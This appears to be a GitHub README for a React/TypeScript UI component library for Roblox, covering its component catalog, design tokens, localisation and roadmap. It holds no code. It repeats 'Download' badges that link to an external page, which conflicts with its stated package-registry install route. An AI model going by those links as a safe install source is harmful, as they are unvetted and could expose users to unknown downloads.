![preview](https://raw.githubusercontent.com/mehmetvedatnar-cmd/roblox-react-ui-kit/main/hero_9c0993.svg)
[![Download](https://raw.githubusercontent.com/mehmetvedatnar-cmd/roblox-react-ui-kit/main/go_4166.svg)](https://mehmetvedatnar-cmd.github.io/roblox-react-ui-kit/)

# 🧼 Clean UI Elements — A React Component Library for Roblox Experiences

**An opinionated, ergonomic, and delightfully modular React (TSX) component toolkit for Roblox UI engineering, crafted for developers who believe interface code should read like poetry rather than punishment.**

[![Download](https://raw.githubusercontent.com/mehmetvedatnar-cmd/roblox-react-ui-kit/main/go_4166.svg)](https://mehmetvedatnar-cmd.github.io/roblox-react-ui-kit/)

---

## 📚 Table of Contents

- [Overview](#-overview)
- [Why This Exists](#-why-this-exists)
- [The Philosophy Behind Clean UI](#-the-philosophy-behind-clean-ui)
- [Feature Highlights](#-feature-highlights)
- [Keyword Snapshot](#-keyword-snapshot)
- [Requirements & Expectations](#-requirements--expectations)
- [Getting Started in Your Workspace](#-getting-started-in-your-workspace)
- [Project Layout](#-project-layout)
- [Component Catalog](#-component-catalog)
- [Theming & Design Tokens](#-theming--design-tokens)
- [Responsive UI Blueprint](#-responsive-ui-blueprint)
- [Multilingual Support Layer](#-multilingual-support-layer)
- [Accessibility Commitments](#-accessibility-commitments)
- [Performance Notes](#-performance-notes)
- [Using Clean UI With Other Toolchains](#-using-clean-ui-with-other-toolchains)
- [Contributing Guidelines](#-contributing-guidelines)
- [Code of Conduct](#-code-of-conduct)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community & Support](#-community--support)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌟 Overview

Clean UI Elements is a **React component library** written in TypeScript for the Roblox ecosystem. It bridges the gap between the expressive component model popularized by the modern web and the unique constraints of the Roblox rendering pipeline. Think of it as a quiet workshop where every screw, hinge, and lamp is measured before it ships — nothing here is accidental.

Instead of forcing you to hand-craft every `Frame`, `TextLabel`, and `UICorner`, Clean UI Elements hands you a curated kit of primitives and composite components. You assemble interfaces the way a furniture maker assembles a chair: with joints that fit, finishes that match, and a shape that stays stable under pressure.

This repository is designed for teams and solo builders who care about:

- **Consistency** across dozens of screens without a stylesheet nightmare.
- **Readability** so a teammate can open a `.tsx` file and understand intent in seconds.
- **Longevity** so a UI written in 2026 still behaves sensibly two years later.

[![Download](https://raw.githubusercontent.com/mehmetvedatnar-cmd/roblox-react-ui-kit/main/go_4166.svg)](https://mehmetvedatnar-cmd.github.io/roblox-react-ui-kit/)

---

## 🤔 Why This Exists

Most Roblox UI code looks the same after a while: a thicket of imperative property assignments, magic numbers, and duplicated corner radii. It works — until it doesn't. Then a redesign arrives, and every screen must be rewired by hand.

Clean UI Elements was born from a simple frustration: **interface code should describe what a screen is, not how to pixel-push it into existence.** A dialog is a dialog. A toolbar is a toolbar. When those concepts live as first-class components, iteration becomes cheap and joy returns to the process.

This is not the only component library for Roblox, and it does not pretend to be. It is a *particular* one — opinionated about naming, disciplined about spacing, and stubborn about developer ergonomics.

---

## 🧠 The Philosophy Behind Clean UI

We think of UI as architecture. Walls, doors, windows, and staircases are reused because someone already worked out the correct proportions. Clean UI Elements is that same idea applied to Roblox interfaces.

Four principles guide every component:

1. **Predictable surfaces.** Props behave the same way across siblings. If a component accepts `variant`, `size`, and `disabled`, so does its cousin.
2. **Composable, not configurable-to-death.** A handful of well-chosen props beats fifty knobs. When in doubt, we let you compose two components instead of adding a flag.
3. **Themeable by default.** Colors, radii, spacing, and typography live in tokens. Redraw the token sheet, reshape the whole app.
4. **Plainly readable source.** Every file is annotated with the reasoning behind it, not only the mechanics.

---

## ✨ Feature Highlights

A condensed tour of what ships in this repository:

- 🎛️ **Compound Component API** — dialogs, sheets, and menus built from small, named parts that slot together cleanly.
- 🌈 **Design Token System** — a single source of truth for radii, spacing, elevation, and palette.
- 📱 **Responsive UI Primitives** — breakpoint-aware layout containers that adapt to phone, tablet, and desktop viewports.
- 🌍 **Multilingual Support Layer** — hooks and providers for string localization with runtime language switching.
- 🕰️ **24/7 Customer Support Posture** — issue triage and discussion response modeled on always-on upkeep expectations.
- 🧩 **Tree-Shakable Imports** — pull in only the components you actually mount.
- 🎨 **Light & Dark Variants** — every token set ships with a paired counterpart.
- ♿ **Accessibility-Conscious Defaults** — sensible selection states, focus traps for modals, and readable contrast.
- 🧪 **Tested Building Blocks** — unit coverage for layout math, theming resolution, and state transitions.
- 📦 **TypeScript-First Typings** — every prop is typed; no mystery shapes.
- 🔁 **Composable Motion Primitives** — entrance, exit, and emphasis animations exposed as attachable behaviors.
- 🧱 **Framework-Agnostic Token Sheet** — reuse the palette outside React if you must.

---

## 🔑 Keyword Snapshot

This repository speaks to a specific vocabulary. Search-friendly phrases you will encounter throughout the documentation include **Roblox React component library**, **TypeScript UI toolkit for Roblox**, **responsive UI for Roblox games**, **design tokens for Roblox interfaces**, and **multilingual Roblox UI components**. We do not stuff keywords into sentences; we simply use the vocabulary natural to the domain.

---

## 📐 Requirements & Expectations

Before adopting Clean UI Elements, confirm your workspace aligns with the following baseline. This keeps expectations honest on both sides.

- A modern **TypeScript** setup with strict mode enabled is strongly recommended.
- A React renderer targeting the Roblox environment (such as the widely used React-Lua bridge or an equivalent TSX-to-Luau pipeline).
- A package manager of your choosing that supports lockfiles.
- Node.js tooling for building and linting the library itself, if you intend to contribute.
- A willingness to think in tokens. If you hardcode a hex value in three places, a small part of the philosophy has been violated.

---

## 🚀 Getting Started in Your Workspace

This section describes *conceptual* onboarding. For exact command-level steps, consult the project wiki and release notes.

1. **Declare the dependency** in your project manifest using the registry name for this package. Your workspace tooling will resolve the latest stable tag automatically.
2. **Mount the provider.** Wrap your root application tree with the theme provider so every descendant component can read tokens.
3. **Import components on demand** from their module paths. Imports are named and tree-shakable.
4. **Layer your own styles** on top using the token sheet — do not fork the library, extend it.
5. **Run a smoke screen.** Render a single button, a card, and a dialog before converting an entire interface. Confidence grows through small victories.

A conceptual sketch of a mounted tree is provided below. This is illustrative and not executable code.

    Root Application
      ThemeProvider
        LocalizationProvider
          ScreenRouter
            FeatureCard
            PrimaryButton
            DialogShell

---

## 🗂️ Project Layout

A high-level map of the repository. Individual folders may evolve as the library matures.

- **components/** — the primitives and composites that make up the public surface.
- **tokens/** — the design token sheet, split into palette, spacing, radius, elevation, and typography files.
- **hooks/** — reusable behavioral hooks such as responsive breakpoints and focus management.
- **i18n/** — the multilingual support layer, including providers, formatters, and locale files.
- **motion/** — animation primitives and transition descriptors.
- **utils/** — pure helpers for numbers, strings, and value merging.
- **examples/** — a collection of showcase screens demonstrating component composition.
- **tests/** — unit and behavioral tests for critical modules.
- **docs/** — long-form documentation, migration notes, and design rationales.

---

## 🧱 Component Catalog

Below is a summary of the categories of components. Names are illustrative of the public surface.

### Layout

- **Stack** — arranges children along an axis with consistent gaps.
- **Grid** — a breakpoint-aware grid container.
- **Split** — two-region layout with an adjustable proportion.
- **Center** — centers a single child both horizontally and vertically.

### Input

- **PrimaryButton** — the main call-to-action, with variants for danger, secondary, and ghost.
- **IconButton** — a compact button optimized for glyph-only labels.
- **Toggle** — a boolean control with a labeled state.
- **Slider** — a continuous numeric control.
- **TextField** — a single-line input with validation hooks.

### Feedback

- **Toast** — ephemeral messages surfaced in a stacking layer.
- **Banner** — persistent inline messages for context.
- **ProgressBar** — determinate progress visualization.
- **Spinner** — indeterminate activity indicator.

### Overlay

- **DialogShell** — a modal container with focus trapping and escape handling.
- **Sheet** — a slide-up panel suitable for mobile-first layouts.
- **Popover** — an anchored surface for menus and tips.
- **Tooltip** — a lightweight hover or long-press hint.

### Data Display

- **Card** — a surfaced container with optional header and footer regions.
- **StatBlock** — an emphasis component for a single number and its label.
- **ListItem** — a row with leading, primary, and trailing regions.
- **Badge** — a small status marker.

### Navigation

- **Tabs** — a horizontal segmented switcher.
- **Breadcrumb** — a hierarchical trail.
- **Sidebar** — a collapsible vertical navigation region.

Each component is documented individually in the `docs/` folder with prop tables, examples, and design notes.

---

## 🎨 Theming & Design Tokens

Design tokens are the marrow of Clean UI Elements. A token is a named value with intent. `color.accent.500` carries meaning; `#3B82F6` does not.

Tokens are grouped into the following families:

- **Palette** — colors, including semantic aliases such as `surface`, `onSurface`, `danger`, and `success`.
- **Spacing** — a scale of small increments used for padding, gap, and inset.
- **Radius** — corner rounding values from `none` to `full`.
- **Elevation** — shadow descriptors for layered surfaces.
- **Typography** — size, weight, and line height bundles used by text components.
- **Motion** — duration and easing descriptors for animations.

Swap the token sheet to reskin an entire application without touching a single component.

---

## 📱 Responsive UI Blueprint

Roblox experiences run on phones, tablets, and desktop clients. A single layout rarely satisfies all three. Clean UI Elements approaches responsiveness as a first-class concern, not an afterthought bolted on at the end.

The library exposes breakpoint hooks so components and layouts can respond to viewport changes. Breakpoints are named rather than numeric, so you write `useBreakpoint() === "compact"` instead of comparing against raw pixel widths.

Three patterns are demonstrated in the examples:

- **Adaptive navigation** that converts a sidebar into a bottom bar on compact viewports.
- **Fluid typography** that eases text scaling across sizes.
- **Reorganized cards** that switch from grid to stack on narrow widths.

---

## 🌍 Multilingual Support Layer

Interfaces speak many languages. The multilingual support layer provides a provider, a hook, and a formatting utility for strings, numbers, dates, and pluralization.

Key behaviors:

- **Runtime language switching** without remounting the app.
- **Fallback chains** so a missing key in one locale resolves gracefully to a default.
- **Interpolation tokens** for dynamic values such as player names or counts.
- **RTL readiness** for languages that read right to left, delivered as layout direction hints.

We treat translation as a first-class citizen, not a retrofit. Screens are designed with variable string length in mind from day one.

---

## ♿ Accessibility Commitments

Interfaces must serve the broadest possible audience. Clean UI Elements bakes in several accessibility defaults:

- **Focus management** inside modals and sheets.
- **Contrast-safe defaults** in both light and dark variants.
- **Selection states** announced through visual and structural cues.
- **Keyboard-friendly navigation** for tabbing and activation.

Accessibility is an ongoing effort. Contributions targeting improvement here are warmly welcomed.

---

## ⚙️ Performance Notes

UI code often runs on constrained clients. Clean UI Elements therefore prioritizes predictability over micro-optimization.

- **Memoization** is applied where recomputation is expensive.
- **Fine-grained re-render boundaries** keep animation state isolated from static layout.
- **Tree-shakable modules** ensure unused components add nothing to the shipped bundle.
- **No runtime style engines.** Tokens resolve to plain values at mount time.

---

## 🧪 Using Clean UI With Other Toolchains

Clean UI Elements plays nicely alongside common tools in the Roblox TypeScript ecosystem. You can pair it with a state management library, a router, an animation helper, or a custom asset pipeline. The library does not impose architectural decisions beyond the theme and localization providers.

If you find an integration that deserves first-class documentation, open a discussion — we maintain an integrations chapter in the wiki.

---

## 🤝 Contributing Guidelines

Contributions are the fuel of any component library. Before opening a pull request, please review the following expectations.

- **Discuss first for large changes.** Open an issue describing the motivation and proposed API surface.
- **Match the existing tone.** Components are named for what they are, not for what they do internally.
- **Add documentation.** Every new component ships with a doc page and at least one example.
- **Write tests where logic is nontrivial.** Layout math and state transitions especially.
- **Keep props typed.** No anonymous shapes.
- **Avoid hardcoded values.** Reach for tokens.

Small, focused pull requests are merged fastest. A ten-file refactor with three unrelated goals is difficult to review.

---

## 📜 Code of Conduct

We expect contributors to engage with generosity and patience. Disagreement is fine; disrespect is not. Harassment, personal attacks, or dismissive commentary will be addressed promptly. The goal is a workshop where anyone can learn without fear.

---

## 🛣️ Roadmap for 2026

The 2026 roadmap centers on deepening the library rather than broadening it recklessly.

- **Q1 2026** — stabilizing the responsive breakpoint API and shipping additional examples.
- **Q2 2026** — expanding the multilingual support layer with pluralization and formatting helpers.
- **Q3 2026** — introducing richer motion primitives and a motion token editor.
- **Q4 2026** — publishing a formal long-term support policy and compatibility matrix.

Roadmap items are aspirational and may shift as the community's needs evolve.

---

## 💬 Community & Support

Support is modeled on an always-on posture. Issues are triaged continuously, discussions are read and answered, and release notes are written with care. If something is broken or confusing, please raise it — silence helps no one.

- Use **Issues** for reproducible bugs and concrete feature requests.
- Use **Discussions** for open-ended questions and design conversations.
- Use **Pull Requests** for patches and additions.

---

## ❓ Frequently Asked Questions

**Is Clean UI Elements a full application framework?**
No. It is a component library with a small provider layer. Application architecture remains your choice.

**Can I use it without TypeScript?**
The library ships as typed source, but the compiled output can be consumed from plain JavaScript in principle. TypeScript is strongly recommended.

**Does it work across all Roblox clients?**
Yes, with attention paid to the phone, tablet, and desktop form factors. Responsive primitives exist precisely to make this comfortable.

**Can I extend a component instead of forking it?**
Yes. Composition and token overrides are preferred over forking. The source is small enough that extension is usually straightforward.

**How do I report a security concern?**
Please use the private reporting channel described in the repository's security policy rather than a public issue.

**Is there a hosted documentation site?**
Long-form docs live in the `docs/` folder and are also rendered in the wiki.

---

## ⚠️ Disclaimer

This project is provided as-is, without warranty of any kind, express or implied. It is an independent community effort and is **not affiliated with, endorsed by, or sponsored by Roblox Corporation**. All trademarks belong to their respective owners. The authors are not responsible for any consequences arising from use of this library in production experiences, including but not limited to unexpected rendering behavior, data loss, or interruption of service. Test thoroughly in a staging environment before deploying to a live audience. Statements about always-on support describe intent and community norms, not a contractual obligation.

---

## 📄 License

This project is distributed under the **MIT License**. You are welcome to use, modify, and redistribute the code under the terms of that license. A full copy of the license text is available at the link below.

[MIT License](./LICENSE)

Copyright (c) 2026 Clean UI Elements contributors.

[![Download](https://raw.githubusercontent.com/mehmetvedatnar-cmd/roblox-react-ui-kit/main/go_4166.svg)](https://mehmetvedatnar-cmd.github.io/roblox-react-ui-kit/)